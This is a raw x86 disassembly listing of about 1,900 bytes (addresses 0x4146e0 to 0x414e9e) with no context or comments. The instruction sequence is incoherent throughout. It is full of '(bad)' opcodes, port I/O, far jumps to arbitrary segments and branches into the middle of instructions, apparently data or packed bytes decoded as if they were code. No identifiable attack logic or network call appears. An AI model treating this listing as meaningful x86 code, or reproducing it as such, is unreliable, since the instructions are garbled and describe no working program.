  4146e0:	inc    ebp
  4146e1:	mov    esp,0xfd7def5c
  4146e6:	in     al,dx
  4146e7:	or     al,0xd0
  4146e9:	in     eax,dx
  4146ea:	int3   
  4146eb:	les    esp,FWORD PTR [ebp+0x33c74416]
  4146f1:	mov    BYTE PTR [eax+ecx*2+0x2643496c],bl
  4146f8:	inc    edx
  4146f9:	pop    edx
  4146fa:	aad    0x56
  4146fc:	and    eax,0xbfc9765c
  414701:	sub    bh,al
  414703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414704:	and    edi,DWORD PTR ds:0xe52d6443
  41470a:	adc    esi,DWORD PTR [edx+esi*8]
  41470d:	repz sti 
  41470f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414710:	test   DWORD PTR [ecx+0x5b],esp
  414713:	fs dec ebx
  414715:	mov    al,dh
  414717:	cmp    eax,0x4c6dcdbc
  41471c:	je     0x4146bc
  41471e:	(bad)  
  414720:	mov    dl,0x77
  414722:	scas   al,BYTE PTR es:[edi]
  414723:	mov    bh,0x7b
  414725:	adc    eax,DWORD PTR [esi]
  414727:	mov    esi,0xb4ab5210
  41472c:	iret   
  41472d:	arpl   WORD PTR [ebx],si
  41472f:	xchg   DWORD PTR [edx-0x7a5e97b0],esp
  414735:	jle    0x414770
  414737:	xchg   esp,eax
  414738:	and    al,0xcc
  41473a:	aam    0x2b
  41473c:	xchg   DWORD PTR [edi+edi*2],eax
  41473f:	popf   
  414740:	mov    edi,0x46d5b071
  414745:	enter  0x88de,0xd7
  414749:	aad    0xaf
  41474b:	mov    al,0xd9
  41474d:	add    esi,DWORD PTR [edx-0x15]
  414750:	push   edx
  414751:	sbb    DWORD PTR [ecx+ecx*1+0x58],edx
  414755:	or     BYTE PTR ds:0xa1259ee9,bl
  41475b:	inc    ebx
  41475c:	ds aas 
  41475e:	inc    eax
  41475f:	push   ss
  414760:	jle    0x414716
  414762:	adc    eax,0xfee5af4a
  414767:	cs push 0xb37be8b6
  41476d:	mov    eax,ds:0xc134a3d5
  414772:	or     DWORD PTR [ecx+0x2d],edi
  414775:	sub    eax,0x460e5f49
  41477a:	mov    dl,0xa3
  41477c:	inc    edx
  41477d:	in     al,0x7f
  41477f:	mov    DWORD PTR [ebp+0x1c1752f7],edi
  414785:	mov    esi,0x874e1584
  41478a:	sub    BYTE PTR [eax],dh
  41478c:	out    0xb7,al
  41478e:	xchg   edi,eax
  41478f:	sar    BYTE PTR ds:0xba48ba9d,0xbf
  414796:	adc    DWORD PTR [ecx+0x689cc5dd],ecx
  41479c:	ins    BYTE PTR es:[edi],dx
  41479d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41479e:	mov    WORD PTR [eax-0x73],es
  4147a1:	jl     0x4147e6
  4147a3:	jb     0x4147ae
  4147a5:	add    BYTE PTR [esp+edi*2-0x2d],cl
  4147a9:	mov    ebp,0x2bd3c451
  4147ae:	sub    al,0x8e
  4147b0:	out    0x46,eax
  4147b2:	dec    esi
  4147b3:	sar    DWORD PTR [eax+edi*2-0x37],0xff
  4147b8:	jmp    0x414832
  4147ba:	stos   BYTE PTR es:[edi],al
  4147bb:	fwait
  4147bc:	inc    ecx
  4147bd:	pop    edx
  4147be:	inc    esp
  4147bf:	fucomi st,st(1)
  4147c1:	jmp    0xb1779c26
  4147c6:	arpl   WORD PTR [edi+0x75c4b49e],dx
  4147cc:	iret   
  4147cd:	jl     0x4147af
  4147cf:	fist   DWORD PTR [esi]
  4147d1:	repz es dec esi
  4147d4:	xor    BYTE PTR [edx+0x52880ff0],bl
  4147da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147db:	cdq    
  4147dc:	cdq    
  4147dd:	in     al,0x49
  4147df:	in     al,dx
  4147e0:	shl    BYTE PTR [ebp+0x64],1
  4147e3:	imul   edi,DWORD PTR [ebp-0x79bcccd8],0x7e52035f
  4147ed:	push   0x3e
  4147ef:	pop    esp
  4147f0:	in     eax,0x58
  4147f2:	cmp    DWORD PTR [eax-0x336e9ae8],ebp
  4147f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147f9:	push   0xffffff91
  4147fb:	arpl   WORD PTR [edi],cx
  4147fd:	adc    al,0x74
  4147ff:	mov    bh,0xe1
  414801:	adc    DWORD PTR [esi+0x2d],edx
  414804:	stc    
  414805:	jns    0x414795
  414807:	out    0xd6,al
  414809:	fxtract 
  41480b:	cmp    DWORD PTR [edx-0x56ce54ad],ebp
  414811:	in     al,dx
  414812:	popf   
  414813:	mov    ds:0x7f99e5be,eax
  414818:	cs pushf 
  41481a:	mov    cl,BYTE PTR [ebx+0x7d]
  41481d:	jno    0x414810
  41481f:	ret    
  414820:	test   cl,bl
  414822:	rcr    DWORD PTR [ecx+esi*4+0x43],0x55
  414827:	test   dl,bh
  414829:	mov    ecx,DWORD PTR [eax+0x7f]
  41482c:	or     eax,0xb302bcf4
  414831:	cmp    dh,BYTE PTR [eax+0x68]
  414834:	and    eax,0xaa918c3c
  414839:	and    ebp,esi
  41483b:	bound  esp,QWORD PTR [ebx-0x74]
  41483e:	adc    edx,0xc18b7678
  414844:	bound  ebx,QWORD PTR [ebx]
  414846:	lods   eax,DWORD PTR ds:[esi]
  414847:	fs inc eax
  414849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41484a:	cld    
  41484b:	cs in  al,dx
  41484d:	dec    ecx
  41484e:	jl     0x414871
  414850:	std    
  414851:	push   esi
  414852:	mov    dl,0xb5
  414854:	into   
  414855:	or     al,0x6d
  414857:	jns    0x414898
  414859:	inc    ecx
  41485a:	test   DWORD PTR [ecx-0x7e],edx
  41485d:	adc    eax,eax
  41485f:	(bad)  
  414860:	popa   
  414861:	xor    al,0xdf
  414863:	pop    es
  414864:	test   bh,bl
  414866:	mov    ah,0xbc
  414868:	jnp    0x4147fc
  41486a:	clc    
  41486b:	push   0x1
  41486d:	xor    ebp,DWORD PTR [ecx-0x6]
  414870:	repz cmp DWORD PTR [edx-0x64be7b2d],esi
  414877:	push   eax
  414878:	mov    ds:0xfb5f857c,eax
  41487d:	mov    ds:0x5167a2f3,eax
  414882:	fadd   QWORD PTR [ecx]
  414884:	(bad)  
  414885:	fxch   st(6)
  414887:	(bad)  
  414888:	and    DWORD PTR [edx-0x5ee1793e],esi
  41488e:	mov    ?,WORD PTR [edx+0x1d]
  414891:	rcl    BYTE PTR fs:[edi+0x2e429ed1],cl
  414898:	loope  0x41490c
  41489a:	push   ds
  41489b:	pushf  
  41489c:	mov    ebx,0x37d528a5
  4148a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148a2:	int    0x33
  4148a4:	in     al,dx
  4148a5:	adc    ch,0x69
  4148a8:	ret    
  4148a9:	in     eax,dx
  4148aa:	(bad)  
  4148ab:	loop   0x4148a4
  4148ad:	add    BYTE PTR [edi-0x338cf00e],cl
  4148b3:	fmul   QWORD PTR cs:[eax+0x50]
  4148b7:	sub    esi,DWORD PTR [edx]
  4148b9:	fimul  WORD PTR [ebx]
  4148bb:	add    dh,BYTE PTR [edx]
  4148bd:	xor    ch,BYTE PTR [ecx-0x599ee631]
  4148c3:	sub    BYTE PTR [edx],bh
  4148c5:	fisubr DWORD PTR [edi+0x30b65c26]
  4148cb:	jmp    0xfef3:0xf88d0840
  4148d2:	xchg   ebp,eax
  4148d3:	mov    edi,ss
  4148d5:	or     al,0xf2
  4148d7:	or     BYTE PTR [ecx],al
  4148d9:	jecxz  0x4148ef
  4148db:	aas    
  4148dc:	adc    al,0x5f
  4148de:	stc    
  4148df:	hlt    
  4148e0:	and    DWORD PTR [ecx],ebx
  4148e2:	and    ecx,DWORD PTR [eax-0x53ad37d5]
  4148e8:	mov    DWORD PTR [ebx],ebx
  4148ea:	sti    
  4148eb:	xacquire xchg DWORD PTR [edi-0x20a9fcb4],esi
  4148f2:	lock lahf 
  4148f4:	fadd   DWORD PTR ss:[edx+eax*8-0xe394346]
  4148fc:	sbb    DWORD PTR [eax],eax
  4148fe:	xchg   ebx,ecx
  414900:	out    0x6f,eax
  414902:	inc    esp
  414903:	inc    esp
  414904:	es sbb ch,bl
  414907:	mov    eax,ds:0x392ee8ae
  41490c:	out    dx,eax
  41490d:	sbb    al,0x2f
  41490f:	mov    esi,0x814b4a80
  414914:	add    eax,0x34be4835
  414919:	int3   
  41491a:	and    DWORD PTR [edx],eax
  41491c:	jmp    0x4c212ca1
  414921:	add    ecx,DWORD PTR [edx+0x36]
  414924:	mov    ebx,0x1af7da0d
  414929:	or     DWORD PTR [ebx],esi
  41492b:	lea    edi,[edi*8-0x586601e3]
  414932:	mov    ebx,0xe9b6dc65
  414937:	retf   
  414938:	(bad)  
  414939:	std    
  41493a:	inc    edi
  41493b:	scas   eax,DWORD PTR es:[edi]
  41493c:	stos   DWORD PTR es:[edi],eax
  41493d:	pop    esp
  41493e:	and    esp,esi
  414940:	xchg   esp,eax
  414941:	cmp    bh,BYTE PTR [ebx]
  414943:	push   ecx
  414944:	pusha  
  414945:	xchg   esp,eax
  414946:	hlt    
  414947:	push   0x17
  414949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41494a:	xor    BYTE PTR [edx-0x28a27b47],bl
  414950:	add    al,0x48
  414952:	jo     0x4149bb
  414954:	push   es
  414955:	retf   
  414956:	mov    DWORD PTR [edi],0xe6225e48
  41495c:	int    0x77
  41495e:	sbb    eax,0x2e5d0be3
  414963:	add    al,0x25
  414965:	add    DWORD PTR [ecx+eax*1-0x3376a146],0xffffffd1
  41496d:	lock or DWORD PTR [ecx+0x16],0x74
  414972:	and    BYTE PTR [ecx+0x3f],dl
  414975:	imul   ebp,DWORD PTR [eax-0x45],0x39
  414979:	aam    0xfa
  41497b:	xor    eax,0xba809dfe
  414980:	xchg   ebp,eax
  414981:	xchg   edx,eax
  414982:	xchg   edi,eax
  414983:	rcr    BYTE PTR [ebp-0x62],cl
  414986:	xor    eax,0x6bfecc7
  41498b:	mov    eax,0x3a5cdf53
  414990:	xchg   esi,eax
  414991:	mov    ds:0x91b6fa15,eax
  414996:	and    BYTE PTR [ebx],cl
  414998:	in     eax,dx
  414999:	(bad)  
  41499a:	sbb    ebp,DWORD PTR [edi]
  41499c:	mov    cl,0xb0
  41499e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41499f:	jns    0x4149d8
  4149a1:	adc    eax,0x1e1b260d
  4149a6:	jae    0x4149a1
  4149a8:	out    dx,al
  4149a9:	loop   0x414a07
  4149ab:	fcomp  DWORD PTR [esi+0x5ac1a641]
  4149b1:	adc    ah,dl
  4149b3:	push   edx
  4149b4:	push   ds
  4149b5:	lahf   
  4149b6:	test   BYTE PTR [edx],cl
  4149b8:	xor    al,0x76
  4149ba:	xchg   ebx,eax
  4149bb:	rcl    al,1
  4149bd:	inc    ecx
  4149be:	sub    bl,BYTE PTR [ebx]
  4149c0:	inc    al
  4149c2:	mov    eax,0xf5dab5bf
  4149c7:	dec    ebp
  4149c8:	fnstenv [ebx-0x67934f63]
  4149ce:	mov    edx,0xd0d62975
  4149d3:	cld    
  4149d4:	jbe    0x41496e
  4149d6:	sbb    al,0x7d
  4149d8:	and    BYTE PTR [eax],0xe3
  4149db:	or     dh,BYTE PTR [edi]
  4149dd:	inc    ecx
  4149de:	dec    edi
  4149df:	adc    ebx,DWORD PTR [eax]
  4149e1:	(bad)  
  4149e2:	mov    ebx,0x1545563
  4149e7:	or     eax,0x67c3e9d8
  4149ec:	xchg   esi,eax
  4149ed:	fs xchg edx,eax
  4149ef:	mov    dl,dh
  4149f1:	mov    DWORD PTR [eax+0x1a],ebp
  4149f4:	push   edx
  4149f5:	ins    DWORD PTR es:[edi],dx
  4149f6:	and    esp,edi
  4149f8:	jo     0x4149c1
  4149fa:	leave  
  4149fb:	jno    0x4149b8
  4149fd:	inc    esi
  4149fe:	sbb    edx,ebp
  414a00:	in     al,dx
  414a01:	and    DWORD PTR [edx],0xd095ca66
  414a07:	in     al,0x22
  414a09:	(bad)  
  414a0a:	mov    WORD PTR [ebp+0x20e0631],fs
  414a10:	mov    bh,0x7e
  414a12:	add    eax,0xb97beb4c
  414a17:	add    ah,BYTE PTR [ebx+0x28]
  414a1a:	repnz and bl,dh
  414a1d:	sbb    ecx,ecx
  414a1f:	imul   esi,DWORD PTR [edx+eiz*1-0x5cbf8fec],0xffffffe7
  414a27:	std    
  414a28:	cmp    BYTE PTR [ebp+0x77],bh
  414a2b:	push   eax
  414a2c:	out    0x67,al
  414a2e:	call   0x6816:0xdfab9eba
  414a35:	icebp  
  414a36:	cmp    BYTE PTR [esi],0x4e
  414a39:	push   ss
  414a3a:	push   fs
  414a3c:	jo     0x414ab8
  414a3e:	aad    0x2e
  414a40:	je     0x414a46
  414a42:	or     dh,BYTE PTR [esi]
  414a44:	(bad)  [edx+0x274ad406]
  414a4a:	and    ah,bl
  414a4c:	mov    ecx,0xce45570d
  414a51:	jmp    0xfab5:0x61ed0f7a
  414a58:	sub    ah,bl
  414a5a:	sub    DWORD PTR [edi-0x63b2aa3b],esi
  414a60:	clc    
  414a61:	jnp    0x414a4a
  414a63:	push   esi
  414a64:	je     0x414a37
  414a66:	fadd   st,st(2)
  414a68:	or     eax,0xcf186b76
  414a6d:	sbb    edx,esi
  414a6f:	jmp    0x7762:0x6aa49c00
  414a76:	jecxz  0x414adf
  414a78:	stos   DWORD PTR es:[edi],eax
  414a79:	xor    BYTE PTR [eax],cl
  414a7b:	lds    ebp,FWORD PTR ds:0x1d3a696b
  414a81:	rol    DWORD PTR [ecx+ebp*1+0x6604cdae],0xc5
  414a89:	repnz cmp DWORD PTR [ebx],ebx
  414a8c:	add    al,0x43
  414a8e:	sbb    al,0xfe
  414a90:	push   es
  414a91:	xchg   BYTE PTR [esi+0x16],bh
  414a94:	leave  
  414a95:	adc    DWORD PTR [ebx-0x29e0e404],ecx
  414a9b:	test   BYTE PTR [edx],0xce
  414a9e:	je     0x414aef
  414aa0:	add    eax,DWORD PTR [eax-0x1f]
  414aa3:	jmp    ecx
  414aa5:	inc    eax
  414aa6:	sub    al,0xb4
  414aa8:	adc    al,0xed
  414aaa:	ds xchg ecx,eax
  414aac:	fnstenv [esi]
  414aae:	ins    DWORD PTR es:[edi],dx
  414aaf:	fidiv  DWORD PTR [ebx+0x39e84f59]
  414ab5:	lods   al,BYTE PTR ds:[esi]
  414ab6:	xor    DWORD PTR [edi-0x35],ebx
  414ab9:	xor    esp,DWORD PTR [esp+eax*4]
  414abc:	xchg   ch,dh
  414abe:	scas   eax,DWORD PTR es:[edi]
  414abf:	jge    0x414a48
  414ac1:	aad    0x19
  414ac3:	jno    0x414b2e
  414ac5:	cwde   
  414ac6:	sub    al,0x1d
  414ac8:	fild   WORD PTR [eax]
  414aca:	sbb    bh,al
  414acc:	inc    eax
  414acd:	push   ecx
  414ace:	cmc    
  414acf:	mov    edi,0xbd0608f9
  414ad4:	loope  0x414b37
  414ad6:	mov    DWORD PTR [esp+edi*2],esi
  414ad9:	mov    eax,ds:0x95487a7c
  414ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414adf:	test   al,0x25
  414ae1:	mov    ebp,0xd919a8df
  414ae6:	shl    DWORD PTR ds:0xafbfb086,1
  414aec:	shl    DWORD PTR [ebx+0x57],1
  414aef:	mov    bl,0x74
  414af1:	sub    eax,0x4e6f7fed
  414af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414af7:	es call 0xc62e:0xc0ed3a39
  414aff:	fs mov dh,0x84
  414b02:	hlt    
  414b03:	add    DWORD PTR [eax+0x58f499d6],0x9dfddc47
  414b0d:	pop    edi
  414b0e:	ret    0xb781
  414b11:	inc    eax
  414b12:	dec    esi
  414b13:	jp     0x414b0e
  414b15:	add    edx,DWORD PTR [esi]
  414b17:	push   eax
  414b18:	xchg   BYTE PTR [ebx+ebp*1+0x54],ah
  414b1c:	icebp  
  414b1d:	test   eax,0x603d4bfd
  414b22:	in     al,0x2c
  414b24:	mov    cl,BYTE PTR [esi-0x4b54f999]
  414b2a:	jae    0x414b1d
  414b2c:	or     esp,0xffffffa0
  414b2f:	adc    ch,bl
  414b31:	sub    esp,DWORD PTR [ebx+ecx*1+0xe]
  414b35:	pop    eax
  414b36:	cmp    BYTE PTR [ecx-0x1a],bl
  414b39:	pop    ebp
  414b3a:	cli    
  414b3b:	mov    ds,ecx
  414b3d:	aas    
  414b3e:	addr16 in al,0xf0
  414b41:	das    
  414b42:	xor    eax,0x507bd4bd
  414b47:	xchg   DWORD PTR [ebp-0x5a3b41b4],ebx
  414b4d:	push   edx
  414b4e:	push   eax
  414b4f:	imul   ebx,edi,0xffffffec
  414b52:	jmp    0x6495:0xfdb5e27e
  414b59:	mov    ebp,0x19a85e68
  414b5e:	fcomip st,st(6)
  414b60:	mov    WORD PTR [eax+0x4eab8a49],fs
  414b66:	nop
  414b67:	dec    ecx
  414b68:	mov    edi,DWORD PTR [eax-0x4a4a7f4a]
  414b6e:	xor    DWORD PTR [ebx-0x9],ebp
  414b71:	and    cl,BYTE PTR [ecx-0x32fdb561]
  414b77:	ss out 0x61,al
  414b7a:	and    eax,0xbd902f27
  414b7f:	add    edi,ecx
  414b81:	and    esi,ebx
  414b83:	push   0xffffffd0
  414b85:	inc    edx
  414b86:	lods   eax,DWORD PTR ds:[esi]
  414b87:	sahf   
  414b88:	jo     0x414b61
  414b8a:	jno    0x414c03
  414b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b8d:	mov    BYTE PTR [edx-0x7ad9ec00],0xc8
  414b94:	scas   eax,DWORD PTR es:[edi]
  414b95:	and    BYTE PTR [eax],ah
  414b97:	xchg   esi,eax
  414b98:	adc    DWORD PTR [edx-0x2f5cb114],ecx
  414b9e:	nop
  414b9f:	or     esp,edx
  414ba1:	repnz push es
  414ba3:	call   0x580e05b3
  414ba8:	leave  
  414ba9:	shr    DWORD PTR [ebx+0x51],cl
  414bac:	or     al,0x6a
  414bae:	loop   0x414b95
  414bb0:	repnz push esi
  414bb2:	push   esi
  414bb3:	int    0xda
  414bb5:	popf   
  414bb6:	add    eax,0xc590c556
  414bbb:	mov    al,0x2b
  414bbd:	icebp  
  414bbe:	aam    0xaf
  414bc0:	push   esp
  414bc1:	dec    ecx
  414bc2:	jle    0x414bcd
  414bc4:	adc    eax,0x8fcfd38d
  414bc9:	push   ds
  414bca:	adc    al,bh
  414bcc:	cmp    al,BYTE PTR [edx+0x75c8196b]
  414bd2:	sub    al,0x6d
  414bd4:	cwde   
  414bd5:	imul   DWORD PTR [ecx-0x1653e594]
  414bdb:	jg     0x414bcd
  414bdd:	jae    0x414c59
  414bdf:	push   edi
  414be0:	outs   dx,DWORD PTR ds:[esi]
  414be1:	aaa    
  414be2:	sub    eax,eax
  414be4:	aad    0x89
  414be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be7:	mov    eax,ds:0xb67f0a4b
  414bec:	repnz mov dl,0xa1
  414bef:	jp     0x414b76
  414bf1:	pushf  
  414bf2:	clc    
  414bf3:	xor    eax,esp
  414bf5:	pop    ebx
  414bf6:	jnp    0x414b99
  414bf8:	and    DWORD PTR [ecx-0x2e],esi
  414bfb:	test   bh,0x8a
  414bfe:	retf   
  414bff:	ret    
  414c00:	and    esp,ebp
  414c02:	add    DWORD PTR [edi],edx
  414c04:	bound  esi,QWORD PTR [ecx-0x42]
  414c07:	jmp    0xd07c:0x28c2a902
  414c0e:	ss xchg edx,eax
  414c10:	mov    eax,0x2fb5754d
  414c15:	push   ss
  414c16:	add    cl,cl
  414c18:	sbb    eax,ecx
  414c1a:	test   BYTE PTR [eax-0x5e819b77],ch
  414c20:	push   edi
  414c21:	(bad)  
  414c22:	adc    BYTE PTR [ebx+0x7e],bl
  414c25:	shl    BYTE PTR [esi],1
  414c27:	sub    al,0x2c
  414c29:	mov    dl,dl
  414c2b:	sbb    DWORD PTR [eax],0x98129e5c
  414c31:	sbb    ebp,DWORD PTR [ebx+0x51]
  414c34:	xchg   ebp,eax
  414c35:	mov    dl,0xed
  414c37:	lods   eax,DWORD PTR ds:[esi]
  414c38:	adc    eax,0xa8179683
  414c3d:	test   eax,0xea35f9c1
  414c42:	mov    ds:0x108f7df1,al
  414c47:	std    
  414c48:	lock pop esi
  414c4a:	mov    al,ds:0x6fefa39
  414c4f:	stc    
  414c50:	mov    al,0x41
  414c52:	adc    esi,DWORD PTR [esi-0x32]
  414c55:	dec    edi
  414c56:	adc    BYTE PTR [ecx-0x76],bh
  414c59:	jmp    0x1f92304
  414c5e:	popf   
  414c5f:	sub    al,dl
  414c61:	aas    
  414c62:	ins    DWORD PTR es:[edi],dx
  414c63:	sub    edi,DWORD PTR [ecx]
  414c65:	mov    al,ds:0x46d0fab5
  414c6a:	xor    BYTE PTR [eax+esi*1-0x1],al
  414c6e:	call   0xc317:0x7e1dae00
  414c75:	ins    BYTE PTR es:[edi],dx
  414c76:	xchg   DWORD PTR [esi+0x50],esi
  414c79:	pop    esi
  414c7a:	jg     0x414c1f
  414c7c:	cld    
  414c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c7e:	test   DWORD PTR [eax-0x1c],eax
  414c81:	sub    eax,0x22bdde66
  414c86:	fcmovne st,st(6)
  414c88:	sub    esp,DWORD PTR [esi-0x3ca52246]
  414c8e:	jae    0x414cb4
  414c90:	mov    DWORD PTR [eax+0x78],0xa832be07
  414c97:	pop    ebx
  414c98:	xchg   edi,eax
  414c99:	mov    ecx,0x6bfb8e69
  414c9e:	(bad)  [ecx+0x4c]
  414ca1:	div    BYTE PTR [ebp+0x4a]
  414ca4:	push   ss
  414ca5:	lods   al,BYTE PTR ds:[esi]
  414ca6:	les    edi,FWORD PTR ds:0xf68ed7f9
  414cac:	xchg   ebx,eax
  414cad:	fimul  DWORD PTR [ebx+0x7]
  414cb0:	test   BYTE PTR [ecx+0x14744856],0xfd
  414cb7:	inc    BYTE PTR [eax+0x416b75c7]
  414cbd:	mov    al,ds:0xc4aa5886
  414cc2:	mov    ds:0x9ecd90cc,eax
  414cc7:	jae    0x414cf0
  414cc9:	loop   0x414cc5
  414ccb:	mov    esi,0xbcdd646a
  414cd0:	pop    esi
  414cd1:	call   0xc1c34189
  414cd6:	inc    esi
  414cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cd8:	cwde   
  414cd9:	mov    ecx,edx
  414cdb:	add    BYTE PTR [ecx+0x3e],dl
  414cde:	cmp    al,0x6
  414ce0:	add    DWORD PTR [eax-0x1bc45617],ebx
  414ce6:	data16 stc 
  414ce8:	xchg   BYTE PTR [edx-0x20ce2029],bl
  414cee:	test   eax,0x58ba0ebf
  414cf3:	stos   DWORD PTR es:[edi],eax
  414cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cf5:	mov    eax,0xd588ff8d
  414cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cfb:	jg     0x414ca0
  414cfd:	fucom  st(6)
  414cff:	mov    edi,0x759f23fb
  414d04:	sbb    edi,ecx
  414d06:	cmp    ch,BYTE PTR ds:[eax+eiz*4-0x4c]
  414d0b:	mov    bl,0xf9
  414d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d0e:	jecxz  0x414cac
  414d10:	je     0x414d58
  414d12:	gs pop esi
  414d14:	and    dl,al
  414d16:	popa   
  414d17:	ins    BYTE PTR es:[edi],dx
  414d18:	or     DWORD PTR [ebp+0x6afd8b1c],ecx
  414d1e:	out    0xc6,al
  414d20:	cmp    DWORD PTR [edi-0x7e],esi
  414d23:	xlat   BYTE PTR ds:[ebx]
  414d24:	mov    esp,0x2f6fe296
  414d29:	xchg   esi,eax
  414d2a:	xchg   esi,eax
  414d2b:	in     al,dx
  414d2c:	and    ebx,DWORD PTR [edi+0x41a7f980]
  414d32:	imul   eax,DWORD PTR [ebx+0xa],0xe148eb1a
  414d39:	stos   BYTE PTR es:[edi],al
  414d3a:	cmp    eax,0xcc580282
  414d3f:	push   0x69
  414d41:	popf   
  414d42:	mov    ah,0x7b
  414d44:	mov    ebp,0x14522c00
  414d49:	in     eax,dx
  414d4a:	shl    DWORD PTR [esi+ebp*8+0x29249e6b],1
  414d51:	pop    esp
  414d52:	push   ecx
  414d53:	out    dx,eax
  414d54:	mov    cl,BYTE PTR [eax+esi*8]
  414d57:	(bad)  
  414d58:	xchg   esp,eax
  414d59:	leave  
  414d5a:	cs ret 0xe6c8
  414d5e:	mov    bh,0x1
  414d60:	out    0x41,eax
  414d62:	(bad)  
  414d63:	ins    DWORD PTR es:[edi],dx
  414d64:	das    
  414d65:	add    al,0x55
  414d67:	xor    DWORD PTR [ecx+0x7c],edx
  414d6a:	fld    TBYTE PTR ds:0xcb708ade
  414d70:	dec    ecx
  414d71:	cmp    DWORD PTR ds:0x7484740c,eax
  414d77:	jmp    0x7e08:0xcaea0286
  414d7e:	rol    DWORD PTR [edx-0x4dba369f],cl
  414d84:	enter  0xb616,0x66
  414d88:	out    0x63,eax
  414d8a:	push   0x733557fa
  414d8f:	push   ds
  414d90:	loope  0x414dce
  414d92:	loop   0x414dd1
  414d94:	sahf   
  414d95:	hlt    
  414d96:	dec    edi
  414d97:	scas   al,BYTE PTR es:[edi]
  414d98:	int3   
  414d99:	dec    edx
  414d9a:	pop    ebx
  414d9b:	xchg   ebx,eax
  414d9c:	jnp    0x414d51
  414d9e:	mov    ch,0x7e
  414da0:	adc    ch,dh
  414da2:	jmp    0x414db8
  414da4:	jne    0x414e04
  414da6:	inc    esp
  414da7:	jg     0x414d63
  414da9:	in     al,dx
  414daa:	outs   dx,BYTE PTR ds:[esi]
  414dab:	bound  ebp,QWORD PTR [edi-0x7e]
  414dae:	mov    bl,0x58
  414db0:	jle    0x414de8
  414db2:	jne    0x414dfc
  414db4:	push   ss
  414db5:	sbb    al,0xf4
  414db7:	lods   eax,DWORD PTR ds:[esi]
  414db8:	popf   
  414db9:	adc    eax,DWORD PTR [edi+eiz*1-0x7e]
  414dbd:	push   0xe9c7e02a
  414dc2:	punpckhbw mm3,QWORD PTR [ebp+0x31]
  414dc6:	inc    ebp
  414dc7:	cmp    edi,ebp
  414dc9:	pop    eax
  414dca:	push   eax
  414dcb:	dec    ebp
  414dcc:	cmp    DWORD PTR [edi],esp
  414dce:	scas   eax,DWORD PTR es:[edi]
  414dcf:	jns    0x414d52
  414dd1:	loopne 0x414e15
  414dd3:	xor    dl,BYTE PTR [ecx-0x80]
  414dd6:	adc    al,0xbd
  414dd8:	mov    dl,0xe9
  414dda:	shl    edx,0x6a
  414ddd:	jbe    0x414dd8
  414ddf:	xor    DWORD PTR [esi-0x5b36cfe1],edx
  414de5:	ret    0xc127
  414de8:	call   0x6ca41637
  414ded:	push   ebp
  414dee:	jb     0x414d9d
  414df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df1:	ffreep st(1)
  414df3:	sbb    bh,bl
  414df5:	mov    esp,0x7182b156
  414dfa:	(bad)  
  414dfb:	sbb    BYTE PTR [edx-0x5c],0xe9
  414dff:	mov    WORD PTR [edi],fs
  414e01:	test   DWORD PTR [ebx+edi*2-0x33],ecx
  414e05:	jg     0x414dbb
  414e07:	xlat   BYTE PTR ds:[ebx]
  414e08:	ficomp WORD PTR [esi+0x6b537b58]
  414e0e:	cmp    edx,DWORD PTR [edi]
  414e10:	call   0xa2b8:0x476aa746
  414e17:	dec    BYTE PTR [ebx+0x27165cfb]
  414e1d:	xor    DWORD PTR [ecx],ebx
  414e1f:	xor    cl,BYTE PTR [eax+0x4626875d]
  414e25:	mov    cl,0x24
  414e27:	mov    dl,0x6
  414e29:	jle    0x414df2
  414e2b:	or     BYTE PTR [edi+0x28],bl
  414e2e:	daa    
  414e2f:	les    edx,FWORD PTR [edx]
  414e31:	fnstsw WORD PTR [ebx+0x40c887c0]
  414e37:	xor    dh,BYTE PTR [edx]
  414e39:	xchg   edx,eax
  414e3a:	xchg   ebp,eax
  414e3b:	sbb    BYTE PTR [esi],dh
  414e3d:	jb     0x414e6d
  414e3f:	sahf   
  414e40:	inc    ecx
  414e41:	leave  
  414e42:	(bad)  
  414e43:	fxch   st(0)
  414e45:	aas    
  414e46:	pop    edi
  414e47:	les    esp,FWORD PTR [esi]
  414e49:	and    dh,BYTE PTR [edi]
  414e4b:	sbb    al,0xf1
  414e4d:	adc    DWORD PTR [ecx],edi
  414e4f:	jns    0x414e75
  414e51:	push   edi
  414e52:	xchg   esp,eax
  414e53:	imul   esp,DWORD PTR [eax],0x66
  414e56:	ret    0x14cc
  414e59:	cdq    
  414e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e5b:	popa   
  414e5c:	pop    ecx
  414e5d:	loop   0x414e41
  414e5f:	add    DWORD PTR [ecx+0x1599f8df],0xec524cb
  414e69:	inc    edi
  414e6a:	jg     0x414e89
  414e6c:	add    eax,0xbcf0e3e5
  414e71:	lods   eax,DWORD PTR ds:[esi]
  414e72:	adc    al,0x5
  414e74:	je     0x414e8b
  414e76:	inc    ebp
  414e77:	fistp  DWORD PTR [edi+0x431e31c3]
  414e7d:	sti    
  414e7e:	out    dx,eax
  414e7f:	push   ebx
  414e80:	lds    ecx,FWORD PTR [eax-0x19]
  414e83:	jns    0x414e70
  414e85:	rol    esp,0x24
  414e88:	(bad)  
  414e89:	ins    BYTE PTR es:[edi],dx
  414e8a:	jecxz  0x414e28
  414e8c:	cmc    
  414e8d:	ret    0x9d29
  414e90:	mov    esi,0xee078a33
  414e95:	xchg   DWORD PTR ds:0x282d4f5,ebp
  414e9b:	into   
  414e9c:	loopne 0x414e32
  414e9e:	jecxz  0x414e36
